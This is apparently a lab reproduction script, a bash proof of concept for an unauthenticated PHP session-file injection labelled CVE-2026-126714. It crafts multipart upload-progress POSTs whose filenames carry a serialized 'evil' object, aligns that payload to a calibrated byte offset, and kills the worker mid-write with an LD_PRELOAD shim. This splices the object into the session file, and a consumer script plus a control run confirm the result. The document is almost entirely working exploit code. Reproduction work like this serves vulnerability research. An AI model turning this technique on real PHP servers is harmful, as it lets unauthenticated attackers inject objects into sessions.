#!/bin/bash
# php2shell — CVE-2026-126714 (phpAfterShell) UNAUTHENTICATED producer:
# the rfc1867 upload-progress variant. Companion to
# php2shell-aftershell-splice-producer.sh, where the application stored a
# user-controlled session string (the advisory's alternative path). Here
# BOTH the carrier and the replacement are written by the multipart
# upload-progress callback itself, PRE-RINIT, before any application code
# runs — the advisory's unauthenticated remote path: any pre-auth HTTP POST
# with a session id and multipart file parts reaches it.
#
# Mechanism (all source-verified on 8.4.26 ext/session/session.c):
#   php_session_rfc1867_update() -> php_session_initialize() (decodes the
#   existing session file), replaces the progress key, php_session_flush(1)
#   -> ps_files_write -> the vulnerable pwrite. The first write of a
#   request fires at MULTIPART_EVENT_FILE_START, always.
#
# Geometry (php serialize handler; decode loop session.c:1121-1145
# tolerates arbitrary junk key names but a tail without '|' destroys):
#   carrier C  = k1rec || k2rec, two multipart POSTs (progress keys "carr"
#                then "dum", session.upload_progress.cleanup=0 so the END
#                handler keeps the keys). k1rec's serialized filename
#                string holds PAD1 || OBJ || PAD2 with OBJ positioned at
#                byte offset K of the file.
#   replacement R (third POST, key "carr" again) = k1new(FILE_START state)
#                || k2rec (decoded from C and re-encoded byte-identically).
#                The kill shim cuts the pwrite at K = len(k1new), leaving
#                k1new || C[K:] = k1new || OBJ || ... || k2rec on the inode
#                (Variant A ordering: no pre-write truncate because
#                len(R) > len(C); the replacement filename is padded long).
#   consumer    = plain session_start() on a fresh worker: decodes k1new,
#                promotes evil|O:8:"stdClass" from what was inert filename
#                bytes, junk key, k2rec — clean EOF, no warning.
#
# Alignment is calibrated, not hand-computed: AFTERSHELL_LOG_ONLY=1 dumps
# the exact pwrite buffers of a no-kill replacement request; K is read
# from the dump (offset of the k2 record), PAD1 is adjusted until the
# carrier's OBJ offset equals K. The kill mode of the shim is unchanged
# from the wake-8 producer harness (partial pwrite of K bytes + SIGKILL).
#
# Usage: bash lab/repro/php2shell-aftershell-splice-upload.sh <php-cgi-bin> [outdir]

set -u
CGI=$(readlink -f "$1")
OUT=${2:-lab/build/evidence}
LABEL=$(basename "$(dirname "$(dirname "$(dirname "$1")")")" | sed 's/^php-//')
mkdir -p "$OUT"
LOG="$OUT/aftershell-upload-$LABEL.log"
: > "$LOG"

REPOROOT=$(dirname "$(dirname "$(dirname "$(readlink -f "$0")")")")
SO="$REPOROOT/lab/preload/aftershell-kill.so"
mkdir -p "$REPOROOT/lab/preload"
cc -shared -fPIC -O2 -o "$SO" "$REPOROOT/lab/php2shell/aftershell-kill.c" || {
    echo "cc failed"; exit 1; }

D=$(mktemp -d)
trap 'rm -rf "$D"' EXIT
SESS="$D/sess"; mkdir -p "$SESS"
SID="uprod"
DUMP="$D/pwrites.bin"
BOUNDARY='---------------------------20896060251896012921717172737'

printf '<?php' > "$D/worker.php"

OBJ='evil|O:8:"stdClass":1:{s:5:"proof";s:5:"pwned";}'
X700=$(head -c 700 /dev/zero | tr '\0' 'X')

# multipart body: PHPSESSID field, upload-progress key, one 1-byte file
# part with an arbitrary raw filename (escapes \ and " per rfc1867.c
# substring_conf, so the stored filename carries the OBJ bytes verbatim).
esc_fn() { printf %s "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'; }

mpbody() { # $1 = progress key, $2 = raw filename -> stdout
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n%s\r\n" "$BOUNDARY" "$SID"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n%s\r\n" "$BOUNDARY" "$1"
    printf -- "--%s\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"%s\"\r\n\r\n1\r\n" "$BOUNDARY" "$(esc_fn "$2")"
    printf -- "--%s--\r\n" "$BOUNDARY"
}

# LP/KA/LGO via globals, like the wake-8 producer harness
run_cgi() { # $1 = bodyfile
    local len; len=$(stat -c %s "$1")
    REDIRECT_STATUS=1 REQUEST_METHOD=POST \
    CONTENT_TYPE="multipart/form-data; boundary=$BOUNDARY" \
    CONTENT_LENGTH="$len" \
    SCRIPT_FILENAME="$D/worker.php" PATH_TRANSLATED="$D/worker.php" \
    QUERY_STRING='' \
    LD_PRELOAD="$LP" AFTERSHELL_KILL_AT="$KA" \
    AFTERSHELL_LOG_ONLY="$LGO" AFTERSHELL_LOG_FILE="$DUMP" \
    ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
    "$CGI" -n -q \
      -d error_reporting='E_ALL&~E_DEPRECATED' -d html_errors=0 \
      -d file_uploads=1 -d upload_max_filesize=1024 \
      -d session.save_path="$SESS" \
      -d session.name=PHPSESSID \
      -d session.use_strict_mode=0 -d session.use_cookies=0 \
      -d session.use_only_cookies=0 -d session.cache_limiter='' \
      -d session.save_handler=files \
      -d session.serialize_handler=php \
      -d session.upload_progress.enabled=1 \
      -d session.upload_progress.cleanup=0 \
      -d session.upload_progress.prefix=upload_progress_ \
      -d session.upload_progress.name=PHP_SESSION_UPLOAD_PROGRESS \
      -d session.upload_progress.freq='1%' \
      -d session.upload_progress.min_freq='0.000000001' \
      -f "$D/worker.php" < "$1"
}

run_consumer() { # $1 = tag
    printf '<?php session_id("%s"); session_start();
echo "%s_EVIL="; var_dump($_SESSION["evil"] ?? null);
echo "%s_KEYS="; var_export(array_keys($_SESSION)); echo "\n";' \
        "$SID" "$1" "$1" > "$D/consumer.php"
    SCRIPT_FILENAME="$D/consumer.php" PATH_TRANSLATED="$D/consumer.php" \
    ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
    "$CGI" -n -q \
      -d error_reporting='E_ALL&~E_DEPRECATED' -d html_errors=0 \
      -d session.save_path="$SESS" -d session.name=PHPSESSID \
      -d session.use_strict_mode=0 -d session.use_cookies=0 \
      -d session.use_only_cookies=0 -d session.cache_limiter='' \
      -d session.save_handler=files -d session.serialize_handler=php \
      -f "$D/consumer.php"
}

offset_of() { # $1 = file, $2 = needle -> byte offset or -1
    python3 -c 'import sys
d=open(sys.argv[1],"rb").read(); print(d.find(sys.argv[2].encode()))' "$1" "$2"
}
seg_after() { # $1 = file, $2 = needle -> bytes from needle offset to end
    python3 -c 'import sys
d=open(sys.argv[1],"rb").read(); i=d.find(sys.argv[2].encode())
sys.stdout.buffer.write(d[i:] if i>=0 else b"")' "$1" "$2"
}


LP="" KA="" LGO=""

# ---- carrier: three multipart POSTs ->
#      C = carrrec(short) || objkrec(PAD+OBJ+PAD3 in filename) || tailrec(short)
# The replacement updates ONLY the "carr" key; objk and tail are decoded
# from C and re-encoded byte-identically into R, so len(R) > len(C) holds
# (Variant A: no pre-write truncate) while the cut K = len(carrnew)
# lands INSIDE C's objk record at the OBJ position.
build_carrier() { # $1 = PAD length (bytes before OBJ inside objk's filename)
    rm -f "$SESS"/sess_*
    local pad fn
    pad=$(head -c "$1" /dev/zero | tr '\0' 'A')
    fn="$pad$OBJ$(head -c 32 /dev/zero | tr '\0' 'B')"
    mpbody carr "z"   > "$D/b1"; run_cgi "$D/b1" >> "$LOG" 2>&1
    mpbody objk "$fn" > "$D/b2"; run_cgi "$D/b2" >> "$LOG" 2>&1
    mpbody tail "z"   > "$D/b3"; run_cgi "$D/b3" >> "$LOG" 2>&1
}

# ---- calibrate K: log-only replacement request, read the FILE_START write
build_carrier 100
LGO=1 LP="$SO" KA=""
rm -f "$DUMP"
mpbody carr "$X700" > "$D/b3"; run_cgi "$D/b3" >> "$LOG" 2>&1
LGO="" LP="" KA=""
K=$(python3 -c 'import sys
d=open(sys.argv[1],"rb").read()
i=d.find(b"=== pwrite"); j=d.find(b"\n", i) + 1   # buffer starts after marker line
print(d.find(b"upload_progress_objk|", j) - j)' "$DUMP")
NW=$(python3 -c 'import re,sys
d=open(sys.argv[1],"rb").read(); m=re.search(rb"=== pwrite n=(\d+) ===",d)
print(m.group(1).decode() if m else "0")' "$DUMP")
echo "calibration: FILE_START write n=$NW, K(len of carrnew record)=$K" >> "$LOG"
if [ "$K" -le 0 ]; then
    echo "calibration FAILED (no k2 record in FILE_START dump — inspect $DUMP)" >> "$LOG"
    echo "   calibration FAILED — see $LOG"; exit 1
fi

# ---- align the carrier so OBJ sits at byte offset K (deterministic loop)
PADLEN=100
build_carrier "$PADLEN"
for i in 1 2 3 4 5 6; do
    M1=$(offset_of "$SESS/sess_$SID" 'evil|O:8:"stdClass"')
    DELTA=$((K - M1))
    echo "align pass $i: OBJ at $M1, target K=$K, delta=$DELTA (PAD1=$PADLEN)" >> "$LOG"
    [ "$DELTA" -eq 0 ] && break
    PADLEN=$((PADLEN + DELTA))
    build_carrier "$PADLEN"
done
M1=$(offset_of "$SESS/sess_$SID" 'evil|O:8:"stdClass"')
if [ "$M1" != "$K" ]; then
    echo "ALIGNMENT FAILED: OBJ at $M1, want $K — inspect $LOG" | tee -a "$LOG"
    exit 1
fi

CARRIER="$D/carrier.bin"
cp "$SESS/sess_$SID" "$CARRIER"
echo "carrier aligned: OBJ at byte $M1 == K=$K, carrier size $(wc -c < "$CARRIER")" >> "$LOG"
LENR=$((NW))
LEN_C=$(wc -c < "$CARRIER")
echo "variant-A check: len(R_fs)=$LENR vs carrier size $LEN_C (must be >= or mod_files.c truncates first)" >> "$LOG"
if [ "$LENR" -lt "$LEN_C" ]; then
    echo "   len(R) < len(C) — harness invalid: pad the replacement filename" | tee -a "$LOG"
    exit 1
fi

# ---- kill run: replacement POST, worker dies mid-FILE_START-write at K
LP="$SO" KA="$K" LGO=""
mpbody carr "$X700" > "$D/b4"; run_cgi "$D/b4" >> "$LOG" 2>&1
RC=$?
LP="" KA=""
echo "kill-run rc=$RC (137 = SIGKILL expected)" >> "$LOG"
FILESZ=$(wc -c < "$SESS/sess_$SID")
echo "file-after-kill: $FILESZ bytes" >> "$LOG"
echo "  bytes-K-onward: $(seg_after "$SESS/sess_$SID" 'evil|O:8:"stdClass"' | head -c 60)" >> "$LOG"

MIXOK=0
python3 - "$SESS/sess_$SID" "$CARRIER" "$K" <<'EOF' >> "$LOG" 2>&1 && MIXOK=1
import sys
f = open(sys.argv[1], 'rb').read()
c = open(sys.argv[2], 'rb').read()
k = int(sys.argv[3])
ok = len(f) > k and f[k:] == c[k:] and f[k:k+48].startswith(b'evil|O:8:"stdClass"')
print(f"splice-check: filelen={len(f)} K={k} tail==carrier-tail:{f[k:]==c[k:]} obj-at-K:{f[k:k+48][:20]!r}")
sys.exit(0 if ok else 1)
EOF
[ "$MIXOK" = 1 ] && echo "  post-kill file state: k1new || C[K:] splice on disk" >> "$LOG" \
               || echo "  post-kill file state: NOT the splice — inspect $LOG" >> "$LOG"

# ---- consumer: fresh worker, plain session_start on the spliced file
run_consumer A >> "$LOG" 2>&1
echo "consumer rc=$?" >> "$LOG"

# ---- control: identical carrier + replacement WITHOUT the kill
build_carrier "$PADLEN"
mpbody carr "$X700" > "$D/b5"; run_cgi "$D/b5" >> "$LOG" 2>&1
echo "control-write rc=$?" >> "$LOG"
run_consumer CTL >> "$LOG" 2>&1

# ---- verdict
echo "== verdict scan (log: $LOG)"
if grep -qE 'AddressSanitizer|runtime error:|SEGV|Assertion.*failed|SUMMARY' "$LOG"; then
    echo "   SANITIZER/ASSERT OUTPUT PRESENT — inspect $LOG"
fi
grep -q '^A_EVIL=object(stdClass)' "$LOG" \
    && echo "   UNAUTH PRODUCER->CONSUMER: promoted stdClass observed" \
    || echo "   no promotion (see $LOG)"
[ "$MIXOK" = 1 ] && echo "   post-kill file state: splice on disk" \
                  || echo "   post-kill file state: NOT the splice"
grep -q '^CTL_EVIL=object(stdClass)' "$LOG" \
    && echo "   CONTROL UNEXPECTED: object without kill — harness invalid" \
    || echo "   control (no kill): no object, as expected"
exit 0
